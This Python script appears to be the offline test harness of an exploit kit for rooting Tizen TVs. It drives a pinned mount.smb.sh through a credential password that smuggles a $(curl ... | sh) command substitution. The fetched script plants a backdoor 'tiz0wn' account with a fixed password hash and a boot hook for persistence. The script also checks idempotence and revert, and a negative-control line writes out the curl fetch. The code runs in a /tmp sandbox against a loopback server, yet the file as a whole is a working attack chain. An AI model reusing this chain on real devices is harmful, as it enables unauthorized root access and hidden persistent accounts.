#!/usr/bin/env python3
"""End-to-end offline proof for the persist-root delivery.

Drives the REAL, hash-pinned ``mount.smb.sh`` sink from a synthesized
credential file inside a disposable /tmp sandbox and watches what the root
shell would have executed. No TV, no SDB, no external network — the only
network use is a loopback HTTP server on an ephemeral 127.0.0.1 port.

It proves, in one run:

- the exact ``pipe`` password authenticates as a literal through the sink's
  credential path and is evaluated inside the ``$( ... )`` substitution;
- the fetched setup script runs against a fake root (TIZ0WN_ROOT), creating
  the tiz0wn account, the /opt boot hook with mode 0755, and the evidence
  markers;
- a second application is idempotent;
- ``--revert`` removes everything byte-exactly;
- a whitespace password (the tracked negative control) delivers nothing.

Run: ``python3 private/persist-root/repro/run_offline.py``
Writes: ``private/persist-root/evidence/offline-persist-<token>.json``
"""

from __future__ import annotations

import hashlib
import http.server
import json
import re
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

HERE = Path(__file__).resolve().parent
PACKAGE = HERE.parent
sys.path.insert(0, str(PACKAGE))

import payload  # noqa: E402
import prelude  # noqa: E402
import smbpath_payload  # noqa: E402

MOUNT_SMB = HERE / "mount.smb.sh"
SANDBOX_BASE = Path(tempfile.gettempdir()) / "tiz0wn-persist-repro"
TEST_TOKEN = "0f1e2d3c4b5a6978"
TEST_HASH = (
    "$6$tiz0wnT3st$kgxSQ4GljhXxY8F6gC/swXU3W7H5xkZL2NCEMoXKwJb0KgmB5fUUObuJQo"
    "svlzbEjbnRY2x3HDOFkCFaZhsYt.1"
)
MANIFEST_DIR = PACKAGE / "evidence"


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1 << 20), b""):
            digest.update(block)
    return digest.hexdigest()


def free_port() -> int:
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 - stdlib name
        body: bytes = self.server.payload  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args: object) -> None:
        return


def run_sink(mount_argument: str, *, debug: bool, environment: dict[str, str]) -> subprocess.CompletedProcess[str]:
    env = {
        **environment,
        "debug": "true" if debug else "false",
        "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
    }
    return subprocess.run(
        ["/bin/bash", str(MOUNT_SMB), mount_argument],
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )


def assembled_from(stdout: str) -> str:
    for line in reversed(stdout.splitlines()):
        stripped = line.strip()
        if stripped and not set(stripped) <= set("v^") and not stripped.startswith(
            ("Options:", "FileName=", "UTIL_OPT=", ">>", "<<")
        ):
            return line
    return ""


def prepare_root() -> Path:
    if SANDBOX_BASE.exists():
        shutil.rmtree(SANDBOX_BASE)
    for sub in ("etc", "opt/etc", "opt/usr/home/owner/share/tmp/sdk_tools", "tmp", "usr/bin"):
        (SANDBOX_BASE / sub).mkdir(parents=True, exist_ok=True)
    (SANDBOX_BASE / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/sh\nowner:x:1000:1000:owner:/home/owner:/bin/sh\n",
        encoding="ascii",
    )
    return SANDBOX_BASE


def credential_file(name: str, password: str) -> Path:
    path = SANDBOX_BASE / "tmp" / f"cred-{name}"
    path.write_text(f"username=q60t\npassword={password}\nsmbpath=\"Q6BENIGN0000\"\n", encoding="ascii")
    return path


def user_count(passwd: Path) -> int:
    return sum(1 for line in passwd.read_text(encoding="ascii").splitlines() if line.startswith("tiz0wn:"))


def main() -> int:
    observed = sha256_file(MOUNT_SMB)
    if observed != payload.MOUNT_SMB_SHA256:
        raise SystemExit(f"mount.smb.sh pin mismatch: {observed} != {payload.MOUNT_SMB_SHA256}")

    prepare_root()
    delivery = payload.build_pipe_password(
        host_ip="127.0.0.1", port=free_port(), http_path="/d"
    )
    server = http.server.ThreadingHTTPServer(("127.0.0.1", delivery.port), _Handler)
    server.payload = b""  # type: ignore[attr-defined]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    results: list[dict[str, object]] = []
    try:
        # 1. prove the exact pipe payload round-trips through the pinned sink
        credential = credential_file("pipe", delivery.password)
        mount_argument = smbpath_payload.build_mount_argument(
            host_ip="192.0.2.10", credential_file=str(credential)
        )
        inspection = run_sink(mount_argument, debug=True, environment={})
        assembled = assembled_from(inspection.stdout)
        results.append(
            {
                "case": "pipe-payload-parses",
                "password_length": delivery.password_length,
                "assembled_command": assembled,
                "ok": "curl" in assembled and "/bin/sh" in assembled,
            }
        )

        # 2. full end-to-end: sink executes the payload against the fake root
        environment = {
            "TIZ0WN_ROOT": str(SANDBOX_BASE),
            "TIZ0WN_ASSUME_ROOT": "1",
            "TIZ0WN_PWHASH": TEST_HASH,
            "TIZ0WN_TOKEN": TEST_TOKEN,
            "TIZ0WN_USER": "tiz0wn",
        }
        server.payload = (
            prelude.build_prelude(
                user="tiz0wn",
                password_hash=TEST_HASH,
                token=TEST_TOKEN,
                shell_host="",
                shell_port="",
            )
            + (PACKAGE / "root_setup.sh").read_text(encoding="ascii")
        ).encode("ascii")
        apply_server_payload = server.payload  # type: ignore[attr-defined]
        execution = run_sink(mount_argument, debug=False, environment=environment)
        hook = SANDBOX_BASE / "opt" / "etc" / "parseinfo.sh"
        passwd = SANDBOX_BASE / "etc" / "passwd"
        # The sink finally executes /bin/mount, which does not exist on the
        # Mac (rc 127, "No such file or directory"). That is the expected
        # benign failure: the injection ran before the mount was attempted.
        benign_mount_failure = (
            execution.returncode == 127
            and "/bin/mount" in execution.stderr
            and "No such file or directory" in execution.stderr
        )
        benign = execution.returncode == 0 or benign_mount_failure
        # The hash must survive the double sed + heredoc path verbatim; a
        # mangled hash here yields an un-loginable account after any self-heal.
        hook_text = hook.read_text(encoding="ascii") if hook.is_file() else ""
        hook_hash_ok = f"TIZ0WN_PWHASH='{TEST_HASH}'" in hook_text
        results.append(
            {
                "case": "pipe-end-to-end",
                "returncode": execution.returncode,
                "stderr_excerpt": execution.stderr.strip().splitlines()[-1:] or [],
                "user_present": user_count(passwd) == 1,
                "hook_mode": (stat.S_IMODE(hook.stat().st_mode) if hook.is_file() else None),
                "hook_hash_verbatim": hook_hash_ok,
                "boot_marker": (SANDBOX_BASE / "opt/usr/home/owner/share/tmp/sdk_tools" / f"tiz0wn-root-{TEST_TOKEN}.out").is_file(),
                "volatile_marker": (SANDBOX_BASE / "tmp" / "tiz0wn-root-ok").is_file(),
                "inner_stdout_silent": "persist-root:" not in execution.stdout,
                "ok": (
                    benign
                    and user_count(passwd) == 1
                    and hook.is_file()
                    and stat.S_IMODE(hook.stat().st_mode) == 0o755
                    and hook_hash_ok
                    and (SANDBOX_BASE / "opt/usr/home/owner/share/tmp/sdk_tools" / f"tiz0wn-root-{TEST_TOKEN}.out").is_file()
                    and "persist-root:" not in execution.stdout
                ),
            }
        )

        # 3. idempotent second trigger
        execution2 = run_sink(mount_argument, debug=False, environment=environment)
        results.append(
            {
                "case": "second-trigger-idempotent",
                "returncode": execution2.returncode,
                "user_lines": user_count(passwd),
                "ok": (
                    (execution2.returncode == 0 or execution2.returncode == 127)
                    and user_count(passwd) == 1
                ),
            }
        )

        # 4. revert restores the fake root: the served body's prelude pins
        # TIZ0WN_ARGS='--revert', so the same curl|sh trigger runs the revert
        revert_server_payload = (
            prelude.build_prelude(
                user="tiz0wn",
                password_hash=TEST_HASH,
                token=TEST_TOKEN,
                shell_host="",
                shell_port="",
                extra_args="--revert",
            )
            + (PACKAGE / "root_setup.sh").read_text(encoding="ascii")
        ).encode("ascii")
        revert_credential = credential_file("revert", delivery.password)
        revert_mount = smbpath_payload.build_mount_argument(
            host_ip="192.0.2.10", credential_file=str(revert_credential)
        )
        revert_environment = dict(environment)
        server.payload = revert_server_payload  # type: ignore[attr-defined]
        revert = run_sink(revert_mount, debug=False, environment=revert_environment)
        server.payload = apply_server_payload  # type: ignore[attr-defined]
        hook_after = hook.exists()
        revert_passwd_count = user_count(passwd)
        results.append(
            {
                "case": "revert",
                "returncode": revert.returncode,
                "hook_present_after_revert": hook_after,
                "user_lines_after_revert": revert_passwd_count,
                "ok": (
                    (revert.returncode == 0 or revert.returncode == 127)
                    and not hook_after
                    and revert_passwd_count == 0
                ),
            }
        )

        # 5. negative control: literal whitespace corrupts the value
        neg_path = str(SANDBOX_BASE / "home" / "owner" / "share" / "tmp" / "sdk_tools" / "s-neg.sh")
        neg_password = f"$(/usr/bin/curl -fso{neg_path} http://127.0.0.1:{delivery.port}/d)"
        neg_credential = credential_file("whitespace", neg_password)
        neg_argument = smbpath_payload.build_mount_argument(
            host_ip="192.0.2.10", credential_file=str(neg_credential)
        )
        run_sink(neg_argument, debug=False, environment={})
        results.append(
            {
                "case": "whitespace-negative-control",
                "script_exists": Path(neg_path).is_file(),
                "ok": not Path(neg_path).is_file(),
            }
        )
    finally:
        server.shutdown()
        server.server_close()

    passed = all(result.get("ok") is True for result in results)
    MANIFEST_DIR.mkdir(parents=True, exist_ok=True)
    manifest = MANIFEST_DIR / f"offline-persist-{TEST_TOKEN}.json"
    manifest.write_text(
        json.dumps(
            {
                "mount_smb_sha256": observed,
                "sandbox": str(SANDBOX_BASE),
                "results": results,
                "passed": passed,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )
    for result in results:
        print(f"[{'OK' if result.get('ok') else 'FAIL'}] {result['case']}")
    print(f"manifest: {manifest}")
    return 0 if passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
